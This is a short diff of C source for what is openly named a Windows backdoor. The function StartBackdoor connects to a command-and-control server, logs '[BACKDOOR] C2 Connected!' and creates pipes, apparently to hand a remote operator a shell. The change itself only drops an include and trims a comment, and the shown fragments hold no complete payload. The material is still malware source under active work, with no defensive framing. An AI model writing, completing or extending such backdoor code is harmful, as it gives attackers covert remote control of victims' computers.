@@ -1,6 +1,5 @@
 #include "../include/config.h"
 #include "../include/types.h"
-#include "../include/winsock_admin.h"
 
 BOOL StartBackdoor(void) {
     SOCKET s = INVALID_SOCKET;
@@ -54,7 +53,7 @@ BOOL StartBackdoor(void) {
     printf("[BACKDOOR] C2 Connected!\n");
     fflush(stdout);
 
-    // 4. Create Pipe (Read/Write handles)
+    // 4. Create Pipe
     if (!CreatePipe(&hReadPipe, &hWritePipe, NULL, 0)) {
         printf("[DEBUG] CreatePipe failed: %lu\n", (unsigned long)GetLastError());
         fflush(stdout);
